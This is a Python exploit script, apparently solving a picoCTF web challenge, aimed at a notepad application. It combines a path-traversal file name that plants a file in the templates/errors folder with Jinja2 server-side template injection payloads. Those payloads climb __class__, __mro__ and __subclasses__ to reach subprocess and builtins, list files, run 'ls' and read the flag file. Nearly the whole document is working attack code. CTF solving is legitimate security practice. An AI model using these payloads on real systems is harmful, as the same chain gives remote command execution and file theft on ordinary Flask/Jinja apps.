import html
import re
from cmd import Cmd
from pathlib import Path
from urllib.parse import urlparse

import requests

BASE_URL = "https://notepad.mars.picoctf.net"

START = "=====start====="
END = "=====end====="

regex = re.compile(f"{START}(.*){END}")


def send(data):
    print(data)
    split_data = data.split(" ")
    payload = split_data.pop(0)
    params = "&" + split_data.pop(0) if split_data else ""

    file_url = "..\\templates\\errors\\".ljust(128, "a")
    data = {"content": f"{file_url}\n{START}{payload}{END}"}

    r = requests.post(f"{BASE_URL}/new", data=data)

    if "?error=" in r.url:
        print(f"Error: Redirected to {r.url}")
        return

    new_file_name = Path(urlparse(r.url).path).stem
    r = requests.get(f"{BASE_URL}?error={new_file_name}{params}")
    match = regex.search(r.text)

    match_data = html.unescape(r.text)
    f = open("data", "w")
    f.write(match_data)
    f.close()
    print(match_data)


# 1st
# send(
#     "{{request[request.args.a][request.args.b][-1][request.args.c]()[273](['ls'],stdout=-1).communicate()}} a=__class__&b=__mro__&c=__subclasses__"
# )


# files flag-c8f5526c-4122-4578-96de-d7dd27193798.txt

# send(
#     "{{request[request.args.a][request.args.b][-1][request.args.c]()[183]()[request.args.p4][request.args.p5][request.args.p6]('os').cat('.')}} a=__class__&b=__mro__&c=__subclasses__&p4=_module&p5=__builtins__&p6=__import__"
# )
send(
    "{{request[request.args.a][request.args.b][-1][request.args.c]()[183]()[request.args.p4][request.args.p5]['open']('flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}} a=__class__&b=__mro__&c=__subclasses__&p4=_module&p5=__builtins__&p6=__import__"
)
# send(
#     "{{request[request.args.a][request.args.b][-1][request.args.c]()[133].listdir('.')}} a=__class__&b=__mro__&c=__subclasses__"
# )
